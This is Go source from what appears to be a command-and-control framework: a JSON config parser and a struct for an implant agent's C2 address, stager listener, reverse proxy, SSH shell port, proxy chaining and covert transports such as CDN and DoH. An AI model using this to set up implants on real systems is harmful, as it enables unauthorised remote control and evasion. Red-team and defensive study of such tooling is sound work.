// ReadJSONConfig read runtime variables from JSON, and apply them
func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
	// parse the json
	var raw map[string]interface{}
	err = json.Unmarshal(jsonData, &raw)
	if err != nil {
		return fmt.Errorf("failed to parse JSON config: %v", err)
	}

	// Helper to safely extract string
	getString := func(key string) string {
		if val, ok := raw[key].(string); ok {
			return val
		}
		return ""
	}

	// Helper to safely extract int
	getInt := func(key string) int {
		if val, ok := raw[key].(float64); ok {
			return int(val)
		}
		return 0
	}

	// Helper to safely extract bool
	getBool := func(key string) bool {
		if val, ok := raw[key].(bool); ok {
			return val
		}
		return false
	}

	config_to_write.CCAddress = getString("cc_address")
	config_to_write.CCHost = getString("cc_host")
	config_to_write.CCPort = getString("cc_port")
	config_to_write.AgentSocksServerPort = getString("agent_socks_server_port")
	config_to_write.AgentSocksTimeout = getInt("agent_socks_timeout")
	config_to_write.StagerHTTPListenerPort = getString("stager_http_listener_port")
	config_to_write.Password = getString("password")
	config_to_write.ShadowsocksLocalSocksPort = getString("shadowsocks_local_socks_port")
	config_to_write.ShadowsocksServerPort = getString("shadowsocks_server_port")
	config_to_write.KCPServerPort = getString("kcp_server_port")
	config_to_write.KCPClientPort = getString("kcp_client_port")
	config_to_write.UseKCP = getBool("use_kcp")
	config_to_write.EnableNCSI = getBool("enable_ncsi")
	// SSHHostKey is []byte, needs special handling if it's base64 encoded in JSON or just string?
	// Assuming it's not in the main config.json usually, or handled elsewhere.
	// But if it is, it might be a string.
	// Let's check if it's in the map.
	if val, ok := raw["ssh_host_key"].(string); ok {
		config_to_write.SSHHostKey = []byte(val)
	}

	config_to_write.Bring2CCReverseProxyPort = getString("bring2cc_reverse_proxy_port")
	config_to_write.SSHDShellPort = getString("sshd_shell_port")
	config_to_write.ProxyChainBroadcastPort = getString("proxy_chain_broadcast_port")
	config_to_write.ProxyChainBroadcastIntervalMin = getInt("proxy_chain_broadcast_interval_min")
	config_to_write.ProxyChainBroadcastIntervalMax = getInt("proxy_chain_broadcast_interval_max")
	config_to_write.PIDFile = getString("pid_file")
	config_to_write.CCIndicatorURL = getString("cc_indicator_url")
	config_to_write.CCIndicatorWaitMin = getInt("cc_indicator_wait_min")
	config_to_write.CCIndicatorWaitMax = getInt("cc_indicator_wait_max")
	config_to_write.CAPEM = getString("ca_pem")
	config_to_write.CAFingerprint = getString("ca_fingerprint")
	config_to_write.C2TransportProxy = getString("c2_transport_proxy")
	config_to_write.CDNProxy = getString("cdn_proxy")
	config_to_write.DoHServer = getString("doh_server")
	config_to_write.SocketName = getString("socket_name")
	config_to_write.AgentRoot = getString("agent_root")
	config_to_write.UtilsPath = getString("utils_path")
	config_to_write.AgentUUID = getString("agent_uuid")
	config_to_write.AgentUUIDSig = getString("agent_uuid_sig")
	config_to_write.AgentTag = getString("agent_tag")
	config_to_write.CCTimeout = getInt("cc_timeout")

	calculateReverseProxyPort := func() (string, error) {
		p, err := strconv.Atoi(config_to_write.AgentSocksServerPort)
		if err != nil {
			return "", fmt.Errorf("WTF? AgentSocksServerPort: %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.AgentSocksServerPort, err)
		}

		// reverseProxyPort
		rProxyPortInt := p + 1
		return strconv.Itoa(rProxyPortInt), nil
	}
	config_to_write.Bring2CCReverseProxyPort, err = calculateReverseProxyPort()
	if err != nil {
		return err
	}

	// these variables are decided by other variables
	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCAddress)
	DefaultShell = config_to_write.UtilsPath + "/bash"

	return
}

// Config build.json config file
type Config struct {
	CCAddress			string	`cbor:"1,keyasint"`	// Address of C2 server, might include port (agent side)
	CCHost				string	`cbor:"2,keyasint"`	// Hostname of C2 server (hostname only)
	CCPort				string	`cbor:"3,keyasint"`	// CC service port, TLS enabled
	AgentSocksServerPort		string	`cbor:"4,keyasint"`	// agent side socks5 proxy server port
	AgentSocksTimeout		int	`cbor:"5,keyasint"`	// timeout (in seconds) for agent side Socks5 server, 0 to disable
	StagerHTTPListenerPort		string	`cbor:"6,keyasint"`	// For stager HTTP server
	Password			string	`cbor:"7,keyasint"`	// password of shadowsocks, socks5 and SSH server
	ShadowsocksLocalSocksPort	string	`cbor:"8,keyasint"`	// socks5 port of shadowsocks
	ShadowsocksServerPort		string	`cbor:"9,keyasint"`	// server port of shadowsocks proxy server, can run on CC and agent
	KCPServerPort			string	`cbor:"10,keyasint"`	// server port of kcp server
	KCPClientPort			string	`cbor:"11,keyasint"`	// client port of kcp
	UseKCP				bool	`cbor:"12,keyasint"`	// enable KCP for Shadowsocks C2 transport
	EnableNCSI			bool	`cbor:"13,keyasint"`	// NCSI connectivity checking, disable when C2 is reachable but NCSI is not
	SSHHostKey			[]byte	`cbor:"14,keyasint"`	// SSH host (private) key (PEM string), used by remote forwarding server
	Bring2CCReverseProxyPort	string	`cbor:"15,keyasint"`	// Used to bring target host to C2, see Bring2CC
	SSHDShellPort			string	`cbor:"16,keyasint"`	// interactive shell
	ProxyChainBroadcastPort		string	`cbor:"17,keyasint"`	// UDP port used for broadcasting msg, used by auto proxy chain
	ProxyChainBroadcastIntervalMin	int	`cbor:"18,keyasint"`	// seconds, set max to 0 to disable
	ProxyChainBroadcastIntervalMax	int	`cbor:"19,keyasint"`	// seconds, set max to 0 to disable
	PIDFile				string	`cbor:"20,keyasint"`	// PID of agent process
	CCIndicatorURL			string	`cbor:"21,keyasint"`	// URL of conditional C2 connection, CC indicator
	CCIndicatorWaitMin		int	`cbor:"22,keyasint"`	// seconds
	CCIndicatorWaitMax		int	`cbor:"23,keyasint"`	// seconds, set max to 0 to disable
	CAPEM				string	`cbor:"24,keyasint"`	// CA cert from server side
	CAFingerprint			string	`cbor:"25,keyasint"`	// CA cert fingerprint
	C2TransportProxy		string	`cbor:"26,keyasint"`	// proxy for C2 transport
	CDNProxy			string	`cbor:"27,keyasint"`	// websocket proxy, see go-cdn2proxy
	DoHServer			string	`cbor:"28,keyasint"`	// DNS over HTTPS server, for name resolving
	SocketName			string	`cbor:"29,keyasint"`	// agent socket, use this to check agent status
	AgentRoot			string	`cbor:"30,keyasint"`	// Where to store agent runtime files, default to /tmp
	UtilsPath			string	`cbor:"31,keyasint"`	// where to store `vaccine` files
	AgentUUID			string	`cbor:"32,keyasint"`	// UUID of agent, used to verify agent
	AgentUUIDSig			string	`cbor:"33,keyasint"`	// UUID of agent signed by CA
	AgentTag			string	`cbor:"34,keyasint"`	// generated from UUID, will be used to identidy agents
	CCTimeout			int	`cbor:"35,keyasint"`	// wait until this amount of milliseconds to re-connect to C2
}

